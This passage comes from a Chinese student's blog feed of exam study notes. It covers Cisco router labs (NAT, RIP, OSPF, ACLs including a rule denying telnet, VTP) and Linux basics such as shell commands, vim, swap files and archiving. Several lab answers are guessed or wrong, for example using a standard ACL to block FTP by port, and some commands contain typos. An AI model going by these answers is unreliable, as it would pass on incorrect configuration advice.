在路由器上为每一个VLAN都配置一个物理连接后，数据流将分不同VLAN流到路由器上不同的端口中，再通过路由器进行路由的转发，以实现VLAN之间的通信。</li></ul></li></ol><h4 id="网络地址转换nat">网络地址转换NAT</h4><p><strong>静态NAT：</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">interface  f0&#x2F;0ip  adddress  172.16.1.1 255.255.255.0ip  nat  inside# 定义内部接口no shutdown(config)#interface   f0&#x2F;1ip  address  202.96.134.1 255.255.255.0ip  nat  outside# 定义外部接口no shutdown(config)#ip  nat  inside  source  static 172.16.1.100   202.96.134.100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p style="color:blue;">ip nat inside source static[本地IP地址] [目标ip地址] # 初始于 inside 向 outside 发送，在outside接口执行源地址翻译 </blockquote><blockquote><p style="color:blue;">ip nat outside source static [global-address] [local-address]， 初始于 outside 向 inside 发送，在inside接口执行源地址翻译 </blockquote><p><strong>动态NAT配置：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">access<span class="token operator">-</span><span class="token builtin">list</span> <span class="token number">10</span> permit <span class="token number">172.16</span><span class="token number">.1</span><span class="token number">.0</span> <span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.255</span><span class="token comment"># 创造一个访问控制列表（ACL）,表号为10，内容是允许172.16.1.0 </span><span class="token comment"># access-list [表号] [permit/deny] [网络号] [反掩码]</span>ip nat pool MYNAT <span class="token number">202.96</span><span class="token number">.134</span><span class="token number">.100</span> <span class="token number">202.96</span><span class="token number">.134</span><span class="token number">.110</span> netmask <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.0</span><span class="token comment"># 配置NAT地址池的名字以及 IP地址范围、子网掩码</span>ip nat inside source <span class="token builtin">list</span> <span class="token number">10</span> pool MYNAT<span class="token comment"># 将ACL 10 匹配得内部源IP地址，转换为地址池MYNAT 中的IP</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p><strong>将静态路由换成默认路由改如何配置？如果从外网向内网私有IP发起通信，是否可以ping通？</strong></p><ul><li>不能ping通，静态NAT技术实现的就是对内部主机的隐藏</li></ul></li><li><p><strong>对第5步中：ip nat inside source list 10 pool MYNAT 命令中，如果使用参数overload，实验结果与本实验有什么区别？</strong></p><ul><li><p>使用参数overload，意味使用PAT（网络地址端口转换）技术，可将多个内部地址映射为一个合法公网地址,但以不同的协议端口号与不同的内部地址相对应</p></li><li><p>内部网络的所有主机均可共享一个合法外部IP地址实现对Internet的访问</p></li><li><p>ip nat inside source list 10  pool MYNAT overload</p></li></ul><p><strong><s>此外内容需要在仿真上做一遍，我还没弄</s></strong></p></li></ol><h4 id="路由协议">路由协议</h4><p><strong>RIP路由协议</strong></p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">Router rip# 启动RIPnetwork 1.0.0.0network 12.0.0.0 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>OSPF路由协议</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Router ospf <span class="token number">1</span><span class="token comment"># 启动ospf协议</span>Network <span class="token number">1.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token number">0.255</span><span class="token number">.255</span><span class="token number">.255</span> area <span class="token number">0</span>Network <span class="token punctuation">[</span>网络号<span class="token punctuation">]</span> <span class="token punctuation">[</span>反掩码<span class="token punctuation">]</span> <span class="token punctuation">[</span>路由区域<span class="token punctuation">]</span>Network <span class="token number">12.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token number">0.255</span><span class="token number">.255</span><span class="token number">.255</span> area <span class="token number">0</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>检查OSPF路由协议的命令</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">Show ip ospf neighbor    &#x2F;&#x2F; 显示现在的Ospf邻居，其中包括邻居ID（Route-id)、优先级、状态、存活时间、IP地址、接口Show ip osfp interface    &#x2F;&#x2F;查看接口是否被加入到正确的区域中，该命令还可以显示各种定时器hello间隔等和邻居关系。Show ip route ospf    &#x2F;&#x2F;显示路由器知道的OSPF路由Show ip ospf database    &#x2F;&#x2F;查看OSPF数据库，包括各种LSA的数据状态Clear ip ospf <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>动态路由协议的配置主要包含哪两个步骤？</p><blockquote><p><s>配置各路由器、PC的相关配置和配置路由协议（我猜的，没找到确切答案）</s></p></blockquote></li><li><p>通过RIP协议的调试步骤，可以得出RIP路由表的默认更新时间约是多少？</p><ul><li>RIP路由协议默认更新周期是30秒</li></ul></li><li><p>OSPF协议通过那条命令可以获得路由器的ID？</p></li></ol><ul><li>show ip protocols</li></ul><ol start="4"><li><p>如果两台路由器一台运行RIP第1版，一台运行第2版，两台主机是否可以ping通？通过使用show ip route 查看两台路由器的路由表，确定版本1与版本2之间究竟谁可以接受谁的路由更新？（单边邻居关系）</p><blockquote><p style="color:blue;">两台主机不能ping通，RIP版本1可以接受版本2，因为RIPv2需要包含子网掩码，而版本1并不含有子网掩码，版本1的协议发往版本2后，版本2会将该报文丢弃，而当版本1接受到版本2的报文时，版本1会收下版本2的报文</p></blockquote></li></ol><h4 id="acl">ACL</h4><pre class="line-numbers language-、" data-language="、"><code class="language-、">access-list[list number][permit&#x2F;deny][source address][address][wildcard mask][log]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>标准ACL</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Access<span class="token operator">-</span><span class="token builtin">list</span> <span class="token number">1</span> deny host <span class="token number">1.1</span><span class="token number">.1</span><span class="token number">.2</span><span class="token comment"># 拒绝来自1.1.1.2的主机通过</span><span class="token comment"># 可以利用关键字"host"来代表通配符掩码0.0.0.0,表示一台主机</span>Access<span class="token operator">-</span><span class="token builtin">list</span> <span class="token number">1</span> permit <span class="token builtin">any</span>Interface f0<span class="token operator">/</span><span class="token number">0</span>Ip access<span class="token operator">-</span>group <span class="token number">1</span> out<span class="token comment"># 访问列表的出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>拓展ACL</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Access<span class="token operator">-</span><span class="token builtin">list</span> <span class="token number">101</span> deny tcp <span class="token number">1.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token number">0.255</span><span class="token number">.255</span><span class="token number">.255</span> <span class="token number">2.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token number">0.255</span><span class="token number">.255</span><span class="token number">.255</span> eq telnet<span class="token comment"># telnet使用的是TCP的23号端口、eq其实是等于....</span>Access<span class="token operator">-</span><span class="token builtin">list</span> <span class="token number">101</span> permit tcp <span class="token builtin">any</span> <span class="token builtin">any</span><span class="token comment"># 这两条语句的顺序;访问表语句的处理顺序是由上到下的。如果我们将两个语句顺序颠倒，将permit语句放在deny语句的前面，则我们将不能过滤来自主机地址的报文</span>Interface f0<span class="token operator">/</span><span class="token number">0</span>Ip access<span class="token operator">-</span>group <span class="token number">101</span> <span class="token keyword">in</span><span class="token comment">#访问控制列表 出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>根据本次实验，你认为ACL一般有哪些配置步骤？</p><p><strong><s>跟上面那个动态路由一样，我没弄出来</s></strong></p></li><li><p>在步骤4中，如果要使得1.0.0.0整个网络无法访问2.0.0.0该如何配置？</p><ul><li>可以使用Access-list 1 deny 指令阻止整个网段的访问</li></ul></li><li><p>在步骤5中，虽然禁止的是telnet，但此时PC1是否可以ping通PC2?为达到ping通的目的，应该如何处理？</p><ul><li>ping 命令通过ICMP协议进行报文传输，在访问控制类别中没有运行ICMP或者IP报文的访问，所以ping指令也无法通信。</li></ul></li><li><p>禁止FTP应该如何配置访问控制列表？</p><ul><li>通过access-list 1 deny命令禁止代表FTP协议的21号端口即可禁止FTP</li></ul></li></ol><h4 id="vtp">VTP</h4><p><strong>配置级联接口的Trunk封装</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">switchport trunk encapsulation dot1q<span class="token comment">#接口的trunk封装802.1Q协议，用于启用trunk</span>switchport mode trunk<span class="token comment">#设置接口模式为trunk模式</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>配置交换机的工作模式</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">vtp mode <span class="token punctuation">[</span>server<span class="token operator">/</span>client<span class="token operator">/</span>transparent<span class="token punctuation">]</span> <span class="token comment">#分别是服务器，客户端和透明模式</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>VTP服务器控制着它们所在域中VALN的生成和修改</li><li>VTP客户机不允许管理员创建、修改或删除VLAN。它们监听本域中其他交换机的VTP通告，并相应修改它们的VTP配置情况</li><li>VTP透明模式中的交换机不参与VTP，交换机处于透明模式时，不通告其VLAN配置信息。它的VLAN数据库更新与收到的通告也不保持同步。可以创建和删除本地的VLAN。这些VLAN的变更不会传播到其他任何交换机上</li></ul><p><strong>更改交换机的域名</strong></p><pre class="line-numbers language-none"><code class="language-none">Switch (config)# vtp domain qrnu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>如果将S2的工作模式更改为透明模式，S2是否会学习S1的VLAN划分？<ul><li>不会，透明模式不会学习服务器的配置</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cisco </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 知识点汇总</title>
      <link href="/2023/02/10/Linux%20%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/"/>
      <url>/2023/02/10/Linux%20%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<h2><center>Linux 知识点汇总</center></h2>[TOC]<h4 id="P4-Linux的基本特征-8个"><a href="#P4-Linux的基本特征-8个" class="headerlink" title="P4: Linux的基本特征 8个"></a>P4: Linux的基本特征 8个</h4><ul><li><strong>开放性</strong>：系统遵循世界标准规范，特别是遵循开放系统互连(OSI) 国际标准 </li><li><strong>多用户</strong>：系统资源可以被不同的用户各自拥有使用。每个用户对自己的资源有特定的权限，互不影响。</li><li><strong>多任务</strong>：计算机同时执行多个程序，而且各个程序的运行互相独立。Linux系统调度每一个进程平等地访问微处理器</li><li><strong>快速性</strong>：Linux 不大在意CPU的速度，它可以把处理器的性能发挥到极限</li><li><strong>安全性</strong>：Iinux 采取了许多安全技术措施，包括对读、写进行权限控制，带保护的子系统、审计跟踪、核心授权等，这为网络多用户环境中的用户提供了必要的安全保障</li><li><strong>网络性</strong>：Linux 是在Internet的基础上产生并发展起来的，因此，完善的内置网络是Linux的一大特点。</li><li><strong>移植性</strong>：Linux能够在从微型计算机到大型计算机的任何环境中和任何平台上运行。</li><li><strong>兼容性</strong>：Linux是一款与POSI (Portable Operating System Interface)相兼容的操作系统，它所构成的子系统支持所有相关的ANSI、ISO、 IETF 和W3C业界标准。</li></ul><h4 id="P25-26-关机与注销"><a href="#P25-26-关机与注销" class="headerlink" title="P25-26: 关机与注销"></a>P25-26: 关机与注销</h4><ol><li><p>从图形界面关机：右上角齿轮</p></li><li><p>从命令行关机</p><ul><li><p><strong>关机命令 shutdown</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># shutdown &#x2F;&#x2F;要等待一会儿# shutdown +5 &#x2F;&#x2F;5min后关机# shutsown 19:20 &#x2F;&#x2F;19：20关机-f&#x2F;-F 重新启动时执行&#x2F;不执行fsck-k 仅送出信息给所有用户，不会实际关机<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>注销命令 exit</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">exit [状态值]&#x2F;&#x2F; 0表示执行成功，其他值表示失败<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>重启命令 reboot</p><pre class="line-numbers language-none"><code class="language-none">-d 重启时不把数据写入记录文件-n 重开机前不检查有未结束的程序-w 仅测试不重启，把数据写入记录文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></li></ol><p><strong>（第三章 考试重点）</strong></p><h4 id="P57-Shell常用特殊符号-7个"><a href="#P57-Shell常用特殊符号-7个" class="headerlink" title="P57: Shell常用特殊符号 7个"></a>P57: Shell常用特殊符号 7个</h4><ul><li>“ ***** “ 表示一个(包括空字符)或多个字符组成的字符串</li><li>“ <strong>?</strong> “ 表示单个字符</li><li>“ <strong>[]</strong> “ 用于指定显示内容范围</li><li>“ <strong>!</strong> “ 用于指定不显示内容，与” <strong>[]</strong> “一同使用</li><li>“ <strong>;</strong> “ 用于同一行中分隔多个命令</li><li>“ <strong>`</strong> “ 命令替代符，包含内容在Shell中为一条命令，并被执行</li><li>“ <strong>#</strong> “ 注释符号，该行内容不被执行</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ls -l &#x2F;bin&#x2F;e*  &#x2F;&#x2F;查看&#x2F;bin目录下的e开头的所有文件和文件夹ls -l &#x2F;bin&#x2F;e？ &#x2F;&#x2F;查看e开头，长度为2的所有文件和文件夹ls [a-c]  &#x2F;&#x2F;为a b c的文件和文件夹ls [!a-c]     &#x2F;&#x2F;显示名不为为a b c的文件和文件夹ls -l  &#x2F;&#x2F;显示目录下的文件和文件夹和查看其详细信息echo &#96;ls -l&#96;  &#x2F;&#x2F;字符串输出为指令执行结果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="P57-Shell常用操作-4个"><a href="#P57-Shell常用操作-4个" class="headerlink" title="P57: Shell常用操作 4个"></a>P57: Shell常用操作 4个</h4><ul><li><p>自动命令补全功能 ——TAB键</p></li><li><p>自动输入历史命令 ——history命令</p></li><li><p>重定向</p><p>  让用户从文件输入命令，或将输出结果存储在文件及设备中，不需要输入输出设备</p><ul><li>输出重定向符**”&gt;”(写入并覆盖)<strong>和</strong>“&gt;&gt;”(追加)**，输入重定向符”&lt;”</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ls -l &gt; test &#x2F;&#x2F;将执行结果写入test文件中，没有test就自动创建&#x2F;&#x2F;显示器无结果表示重定向成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>管道</p><blockquote><p>管道是一种通信机制，是一种特殊文件，可以进行读写。</p></blockquote><blockquote><p>除首尾的两个命令，每一个命令的输入都来自前一个命令的输出</p></blockquote><blockquote><p>“ <strong>|</strong> “ 将多个简单命令结合在一起，实现复杂的功能</p></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ls -l | grep test &#x2F;&#x2F;查看当前目录下test的详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="P61-Shell常用命令-10个"><a href="#P61-Shell常用命令-10个" class="headerlink" title="P61: Shell常用命令 10个"></a>P61: Shell常用命令 10个</h4><p>（第四题考 书上命令要很了解）</p><ul><li><p><strong>ls 查看指定工作目录下的内容</strong></p><blockquote><p style="color:blue;">ls [选项] [路径]</p></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ls -a&#x2F;-A 显示所有文件及目录，列出&#x2F;不列出隐藏文档(隐藏文档名称开头有&quot;.&quot;)ls -l 除文件名外，显示详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>pwd 查看当前工作目录的绝对路径</strong></p></li><li><p><strong>uname 查看当前系统内核信息</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">uname 显示内核名uname -r 显示内核版本号uname -o 显示系统信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>cd 切换目录</strong></p><blockquote><ul><li><p style="color:blue;">cd [路径]</p></li></ul></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cd &#x2F; &#x2F;&#x2F;切换到&#x2F;目录cd ~ &#x2F;&#x2F;切换到当前用户主目录cd .. &#x2F;&#x2F;切换到上一级目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>cat 显示文件内容</strong></p><blockquote><ul><li><p style="color:blue;">cat [选项] [文件] </p></li></ul></blockquote></li><li><p><strong>clear 清屏</strong></p></li><li><p><strong>sudo 切换用户身份执行</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$sudo adduser Me &#x2F;&#x2F;以root用户运行adduser命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>su 切换用户</strong></p><blockquote><ul><li><p style="color:blue;">sudo    [选项] [命令]    </p></li></ul></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$sudo su root &#x2F;&#x2F;切换到root用户#su Me &#x2F;&#x2F;切换到Me用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>ifconfig 显示和配置网络设备属性</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">interface 网络接口的名称，如eth0(网卡) ifconfig eth0 &#x2F;&#x2F;查看eth0的网络情况ifconfig eth0 up&#x2F;down &#x2F;&#x2F;激活或关闭eth0ifconfig eth0 192.168.0.25 netmask 255.255.255.0 &#x2F;&#x2F;设置eth0的IP地址和子网掩码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>man 系统帮助(命令的详细内容和使用方法)</p><blockquote><ul><li><p style="color:blue;">man [命令名]</p></li></ul></blockquote><pre class="line-numbers language-none"><code class="language-none">man ls &#x2F;&#x2F;查看ls命令的详细内容<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="P65-96-编辑器-2个"><a href="#P65-96-编辑器-2个" class="headerlink" title="P65-96: 编辑器 2个"></a>P65-96: 编辑器 2个</h4></li></ul><p>(编辑器的基本使用，考察，至少知道哪个是编辑器)</p><p><strong>1.Gedit编辑文档</strong></p><p>窗口四个部分：菜单栏、工具栏、文档编辑栏、状态栏</p><p>菜单栏：文件、编辑、查看、搜索、工具、文档、帮助</p><ul><li>文件：新建、打开、保存、保存为、还原、打印预览、打印、关闭、推出</li><li>编辑：撤销、重做、剪切、复制、粘贴、删除、全部选中、插入日期和时间、首选项</li><li>查看：……</li></ul><pre class="line-numbers language-none"><code class="language-none">gedit test.cpp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>“+” 前台运行</p><p>“&amp;” 后台运行，进入自己的编辑器 </p></blockquote><p><strong>2.VIM的使用和配置</strong></p><p><strong>3种工作模式：输入模式、指令模式、底行模式</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">vim test &#x2F;&#x2F;光标置于最后一行vim n test &#x2F;&#x2F;光标置于第n行vim pattern test &#x2F;&#x2F;光标置于第一个与pattern匹配的串处vim -r test &#x2F;&#x2F;发生系统崩溃，恢复文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>只读模式切输入模式</p><pre class="line-numbers language-none"><code class="language-none">i 光标前(光标在第一行第一列)a 光标后(光标在第一行第二列)I 当前行首A 当前行尾o&#x2F;O 当前行之下&#x2F;上新开一行r 替换当前字符……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>输入模式切指令模式 <strong>Ecs键</strong></p><pre class="line-numbers language-none"><code class="language-none">移动光标类指令：光标上移一行 k ; 光标下移一行 j光标左移一字符 h ; 光标右移一字符 l……屏幕翻滚类指令：Ctrl+u 文件首翻半屏……复制、删除、粘贴类指令：……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>指令模式切底行模式  <strong>: 或 ? 或 /</strong></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;pattern 从光标开始处向文件尾搜索pattern?pattern 从光标开始处向文件首搜索pattern:w 保存  :x 保存并退出  :q 退出  :! 强制退出:q! 不保存文件并退出:wq 保存并退出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p><strong>VIM配置</strong></p><p>定制VIM编辑器属性方便编写文档，配置文件地址为/etc/vim/vimrc，该文件会在启动时读取，该命令为底行模式命令，命令写入文件后使用时不必重复键入命令</p><p>更新最新vim版本(vim,vim-common,vim-doc,vim-runtiem)，切换到root权限下，打开vim配置文件(vim /etc/vim /vimrc)，将需要命令前的注释键#删除。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">syntax on 关键字高亮set tabstop&#x3D;4 按下tab键跳跃4个光标set background&#x3D;dark 更改背景为深色……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="P77-挂载"><a href="#P77-挂载" class="headerlink" title="P77: 挂载"></a>P77: 挂载</h4><p>挂载：在Linux或UNIX系统中，<strong>任何个种类的文件系统被创建后，都需要挂载到某个特定的目录才能使用，这个过程相当于激活一个文件系统</strong>，使它能够被使用。</p><p>Linux使用<strong>mount工具</strong>来对文件系统进行挂载。挂载文件系统时需要明确挂载点，比如在安装Ubuntu的过程中，读者实际上已经接触过挂载的过程了，在创建文件系统后，操作系统会提示将此文件系统挂载至哪个位置，而这个位置就是挂载点，在那个时候，通常都选择挂载点为“/”，即根目录。此外，还可以利用该工具挂载其他种类的文件系统，也需要涉及挂载点的选择，挂载点的实质是一个空置的目录。</p><p>Windws文件系统的挂获原理是将磁盘分成若干分区，在各个分区中挂载文件系统。而Linux的挂载原理与Windows不同，它是将磁盘空间挂载在一个目录下。</p><h4 id="P81-swap交换分区"><a href="#P81-swap交换分区" class="headerlink" title="P81: swap交换分区"></a>P81: swap交换分区</h4><ul><li><p>什么是交换分区？</p><ul><li>在Linux中，交换分区是“虚拟内存”技术的集中体现。它代替了Windows中交换文件的概念，但实质都是<strong>利用硬盘空间，临时当作内存使用</strong></li><li>虚拟内存在功能上突破了物理内存的限制，是程序可以操纵大于实际物理内存的空间，更重要的是，虚拟内存是隔离每个进程的安全保护网，可以使每个进程都不受其他程序的干扰</li></ul></li><li><p><font color=Brown>怎么交换？有什么功能？交换多少合适？</font></p><ul><li><p>当系统的物理内存不够用的时候，才进行分区的交换。将物理内存中的一部分空间释放出来，以供当前运行的程序使用，被释放的空间的程序被临时保存到交换分区中，等到那些程序要运行时，再从交换分区中恢复保存的数据到内存中。被释放的空间可能来自一些很长时间没有什么操作的程序。</p></li><li><p>分配太多的交换分区会浪费磁盘空间，而交换分区太少，系统则会发生错误。通常情况下，交换分区应<strong>大于或等于物理内存的大小</strong>，最小<strong>不应小于64M</strong>，通常交换分区得大小应是物理内存(虚拟机的)得<strong>2~2.5倍</strong>。</p><blockquote><ul><li><p>不是所有物理内存中交换出来的数据都会被放到交换分区中，会导致不堪负重，有相当一部分数据会被直接交换到文件系统，如文件读写</p></li><li><p>交换分区是”匿名“内存数据的交换空间。”匿名“内存数据如malloc和new函数生成的对象的数据，以及堆栈中一些状态和变量数据等。malloc和new函数生成的对象的数据，即人为在内存上进行的空间操作，它们在文件系统中没有相应的”存储“文件，需要交换分区。</p></li></ul></blockquote></li></ul></li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># swapon -s &#x2F;&#x2F;查看当前系统的交换分区情况Filename表示当前交换分区挂载的位置，Type表示该分区的文件格式，partition表示交换分区，&#x2F;dev&#x2F;sda5表示第一块硬盘的第一个扩展分区的第一个逻辑磁盘&#x2F;dev&#x2F;hda, &#x2F;dev&#x2F;hdb, &#x2F;dev&#x2F;sda, &#x2F;dev&#x2F;sdbhda一般是指IDE接口的硬盘，hda指第一块硬盘，hdb指第二块硬盘,等等；sda一般是指SATA接口的硬盘，sda指第一块硬盘，sdb指第二块硬盘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>交换分区的数量对性能有很大的影响。因为分区的交换操作是磁盘I/O的操作，多个交换分区可以轮流使用，均衡I/O的负载，而单一交换分区会很忙使系统大多数时间处于等待状态，效率很低。系统很慢，但CPU不忙，说明问题在I/O上。</li></ul><p><strong>交换分区的管理</strong></p><p>交换分区是分页管理的，每一页的大小和内存也得大小一样，以方便数据交换。</p><blockquote><p>旧版本实现交换分区，用交换分区第1页作为所有交换分区的一个”映射“，即第1页的每一位都对应一页交换分区。如果这一位是1，表示此页可用；如果这一位是0，表示此页是环块，不可用。</p></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ vmstat 3  &#x2F;&#x2F;每3秒捕获一次系统性能指标Procs下的r表示正在等待的进程数量（等待块），b表示输入输出Memory下的swpd表示使用的Swap空间的大小Swap下的si表示系统的交换回内存的总量，so表示CPU每秒交换总量以上指标的数值越大，表示系统越繁忙，其繁忙程度与系统具体的配置有关。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230209224236885.png"></p><p><font color="red"><strong>交换分区常用管理方法</strong></font> </p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">1.切换为超级用户（管理员），cd到&#x2F;root目录下sudo su rootcd &#x2F;root2.创建一个swap文件（有连续空间的），其路径为&#x2F;root&#x2F;swapfiledd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;&#x2F;root&#x2F;swapfile bs&#x3D;1024 count&#x3D;65536(ls &#x2F;&#x2F;存在一个snap和swapfile文件)3.格式化swap分区mkswap swapfile &#x2F;&#x2F;将刚才建立的&#x2F;root&#x2F;swapfile文件格式化为swap格式4.激活swap分区swapon swapfile5.检查刚建立的交换分区文件是否存在swapon -s6.回收&#x2F;root&#x2F;swapfile文件所占用的交换空间swapoff swapfile7.删除&#x2F;root&#x2F;swapfile文件rm swapfile(永久创建 vim &#x2F;etc&#x2F;fstab)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="P88-91-压缩和解压-3个"><a href="#P88-91-压缩和解压-3个" class="headerlink" title="P88-91: 压缩和解压 3个"></a>P88-91: 压缩和解压 3个</h4><ul><li><p><strong>zip和unzip</strong></p><ul><li><p>zip命令一般解压有规则特征的应用程序</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">zip -m abc.zip a b c &#x2F;&#x2F;-m:压缩后，删除原始文件(将文件移入压缩文件) zip -r test.zip test&#x2F; &#x2F;&#x2F;-r:递归处理，压缩指定目录下的所有文件和子目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>unzip解压</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">unzip abc.zip &#x2F;&#x2F;直接解压，压缩文件依然存在unzip -d test1 abc.zip &#x2F;&#x2F;-d&lt;目录&gt;:指定文件解压后的存储目录，没有的话新建unzip abc.zip -x a &#x2F;&#x2F;-x&lt;文件&gt;：指定压缩文件中不解压的文件unzip -l abc.zip &#x2F;&#x2F;-l:显示压缩文件所包含的文件unzip -Z abc.zip &#x2F;&#x2F;-Z:显示压缩文件中文件的具体信息，不解压<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><strong>tar解压规则/不规则程序</strong></p><p>（1）-cvf：文件归档但不压缩</p><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps15.jpg" alt="img" style="zoom: 67%;" /> </center>（2）gzip压缩和解压缩 -z</li></ul><p>-c：压缩；-x：解压缩</p><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps16.jpg" alt="img" style="zoom: 67%;" /> </center>  <center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps17.jpg" alt="img" style="zoom:67%;" /> </center>（3）bzip2压缩和解压缩 -j<p>-c：压缩；-x：解压缩</p><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps18.jpg" alt="img" style="zoom:67%;" /> </center>  <center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps19.jpg" alt="img" style="zoom:67%;" /> </center>#### P92：文件系统管理命令 6类20个<ol><li><p>文件的基本操作</p><ul><li><p><strong>touch 创建一个新文件，存在则修改文件最后修改日期</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">touch [参数] [文件名]touch a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>cp 复制一个或多个文件，也可以复制一个目录</strong></p><blockquote><ul><li><p style="color:blue;">touch [参数] [源地址] [目的地址]</p></li></ul></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cp a.cpp c.cpp &#x2F;&#x2F;复制a.cpp到当前目录c.cpp中-v 查看复制过程-i 询问，是否覆盖原来已经存在的同名文件-r 递归处理，实现目录复制<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>mv 